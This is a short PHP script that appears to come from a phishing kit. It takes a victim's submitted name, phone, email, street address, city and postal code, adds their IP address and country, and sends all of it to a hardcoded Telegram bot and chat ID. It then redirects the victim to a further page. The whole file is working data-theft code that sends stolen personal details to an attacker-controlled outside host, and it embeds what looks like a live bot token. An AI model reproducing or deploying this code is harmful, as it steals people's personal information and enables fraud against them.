<?php
$token   = "9069467637:AAFTHGhra36aJFJw-q6ImtDv7R4Oll0kCJk";
$chat_id = "7366487860";

$fullName = isset($_POST['fullName']) ? htmlspecialchars($_POST['fullName']) : '';
$phone  = isset($_POST['phone'])  ? htmlspecialchars($_POST['phone'])  : '';
$email   = isset($_POST['email'])   ? htmlspecialchars($_POST['email'])   : '';
$address   = isset($_POST['address'])   ? htmlspecialchars($_POST['address'])   : '';
$city   = isset($_POST['city'])   ? htmlspecialchars($_POST['city'])   : '';
$zipCode   = isset($_POST['zipCode'])   ? htmlspecialchars($_POST['zipCode'])   : '';

$ip      = $_SERVER['REMOTE_ADDR'];
$country = @file_get_contents("https://ipapi.co/{$ip}/country_name/");

$message  = "🔢 *Address Form*\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "👤 fullName #: `{$fullName}`\n";
$message .= ">> phone: `{$phone}`\n";
$message .= ">> email: `{$email}`\n";
$message .= ">> address: `{$address}`\n";
$message .= ">> city: `{$city}`\n";
$message .= "📮 Postal Code: `{$zipCode}`\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "🌐 IP: `{$ip}`\n";
$message .= "🌍 Country: `{$country}`\n";

$url = "https://api.telegram.org/bot{$token}/sendMessage";
$data = [
    'chat_id'    => $chat_id,
    'text'       => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];
@file_get_contents($url, false, stream_context_create($options));

header("Location: proc.php");
exit();
?>
